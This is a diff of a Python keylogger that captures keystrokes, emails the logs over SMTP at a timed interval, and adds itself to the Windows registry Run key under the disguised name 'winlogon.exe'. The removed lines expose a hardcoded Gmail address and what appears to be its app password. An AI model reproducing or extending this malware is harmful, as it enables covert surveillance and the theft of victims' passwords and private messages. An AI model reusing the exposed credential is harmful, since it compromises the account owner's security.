@@ -1,19 +1,16 @@
 import os
-import winreg
+import winreg   # for add to autostart in registry
 import keyboard  # for keylogs
 import smtplib  # for sending email using SMTP protocol (gmail)
-# Timer is to make a method runs after an `interval` amount of time
 from threading import Timer
 from datetime import datetime
+from secrets import *
 
 SEND_REPORT_EVERY = 60  # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "oniikwat@gmail.com"
-EMAIL_PASSWORD = "zwzvxpfxccaemxyb"
 
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
-        # we gonna pass SEND_REPORT_EVERY to interval
         self.interval = interval
         self.report_method = report_method
         # this is the string variable that contains the log of all
@@ -75,9 +72,9 @@ class Keylogger:
         server.quit()
 
     def registeradd(self):
+        #s_name = "keylogger.exe"
         s_name = "winlogon.exe"
         address = os.path.abspath(os.getcwd()) + '\\' + s_name
-        #print(address)
         key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
         open = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                               key_value, 0, winreg.KEY_ALL_ACCESS)
